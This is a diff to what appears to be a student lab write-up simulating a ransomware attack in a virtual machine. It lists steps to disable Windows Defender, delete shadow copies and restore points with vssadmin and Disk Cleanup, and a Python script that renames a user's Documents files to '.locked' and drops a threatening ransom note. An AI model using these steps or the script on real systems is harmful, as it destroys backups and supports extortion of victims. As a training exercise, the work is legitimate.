@@ -361,7 +361,8 @@ reg query HKLM /f password /t REG_SZ /s #searches top-level registry hive for en
 
 - Antivirus services are deactivated through the Virus & Threat Protection settings inside the Windows Security App. Real-time protection is turned off, blocking the detection of malware installation and allowing it to run. This is only a short-term effect, as it will be configured back on once the computer is restarted. Therefore, this step should be taken immediately before malware deployment to ensure the setting remains off.
 
-(insert evidence)
+<img width="3840" height="2160" alt="Antivirus shutoff" src="https://github.com/user-attachments/assets/e6a8a541-f790-4b2e-9e4d-37dc83526ee0" />
+
 
 2. Shadow Copy Deletion
 
@@ -373,44 +374,54 @@ vssadmin delete shadows /all #Volume Shadow Copy Service Administrative is calle
 
 - Below are the results. Please note that there are no items listed, as there were no shadow copies created for the Virtual Machine. Normally, a list of copies will be shown, including the path where it was saved.
 
-(insert evidence)
+<img width="3840" height="2160" alt="shadow copies deleted" src="https://github.com/user-attachments/assets/e5f486ed-da2b-4970-8e4d-990510cff380" />
+
 
 - This can also be done through Disk Cleanup. First, click on 'clean up system files'.
 
-(insert pic)
+<img width="3840" height="2160" alt="clean up system files" src="https://github.com/user-attachments/assets/7d735842-e63b-4ff5-ab2c-a49f717c5f06" />
+
 
 - Then go to the 'more options' tab after the scan has completed. Once there, select the 'clean up' option under 'system restore and shadow copies' to delete all backups on the system.
 
-(insert pics)
+<img width="3840" height="2160" alt="cleaning up system restores" src="https://github.com/user-attachments/assets/18acb000-786a-444c-ab32-e1bb92d4f354" />
+
 
 3. Backup Destruction
 
 - Through the Control Panel > System and Security> System > System Protection, restore points can be configured to disable and delete any existing backups.
 
-(insert pic)
+<img width="3840" height="2160" alt="deleting all restore points and disabling system protection" src="https://github.com/user-attachments/assets/8ca4f126-0a70-4b66-9d1b-4b8e3a2f2fe9" />
+
+- Below is the message box showing that the deletion was a success.
+
+<img width="3840" height="2160" alt="after deleting restore points" src="https://github.com/user-attachments/assets/95aa47d0-c65e-4fe4-aadc-3b0ef2250346" />
+
 
 #### Execution
 
 - Through Visual Studios, using the Python language, the following code was executed to simulate the locking of files and creating a ransom note.
 
-(update code and add comments!!)
+```
 import os
 
-// Directory to 'lock' files in (choose a harmless test folder!)
-target_dir = "C:/Users/YourUser/Desktop/testfolder"
+# Directory path where all files will be locked
+target_dir = "C:/Users/user1/Documents"
 
-for filename in os.listdir(target_dir):
-    file_path = os.path.join(target_dir, filename)
-    if os.path.isfile(file_path):
-        # Simulate locking by renaming the file
-        os.rename(file_path, file_path + ".locked")
+for filename in os.listdir(target_dir): #loops through the folder for all files contained within it
+    file_path = os.path.join(target_dir, filename) #creates a file path through the join method
+    if os.path.isfile(file_path): #ensures the file path points to a file and not a directory 
+        os.rename(file_path, file_path + ".locked") #filename is changed to locked type
 
-// Create a ransom note
-with open(os.path.join(target_dir, "README_RESTORE_FILES.txt"), "w") as f:
-    f.write("Your files have been 'locked'. This is a simulation for educational purposes.\nNo data has been harmed.\n")
+# Create a ransom note, must be done after the locking, otherwise note will be locked as well
+with open(os.path.join(target_dir, "README_RESTORE_FILES.txt"), "w") as f: #writes a new file in the directory path identified earlier
+    f.write("Your data has been stolen and servers are encrypted. \nWe are the only ones that can unlock it for you.\n \nYou can gain access through initiation of negotiations with us.\n \nIf authorities are contacted, all data will be lost forever!\n")
+```
 
-(add pic of result)
+<img width="3840" height="2160" alt="ransomware results" src="https://github.com/user-attachments/assets/e4d3a575-c813-4bf4-b5b3-534034349693" />
+
 
 - The ransom note was created by studying several previous instances collected in a database on Group-IB (https://www.group-ib.com/resources/ransomware-notes/). All of the notes inform the user about what has happened, the group responsible, and that they are the only ones who can help unlock the files. Additionally, the notes outline the rules governing how the victims should proceed to ensure cooperation. These range in length and style of language, some friendly addressing to "friends" or formal, such as "Dear Management". Each will have different psychological effects. A more friendly approach might be trying to gain trust with the users for easier cooperation. The other approach might go with fear tactics, marking themselves as a threat to be taken seriously. The tactic used in this study was a threatening tone to induce panic, preying on quick, illogical decisions for financial gain. 
 
-(add ransom note pic)
+<img width="3840" height="2160" alt="ransom note" src="https://github.com/user-attachments/assets/49b632c1-e940-4cb1-93fb-d5b20e47c778" />
+
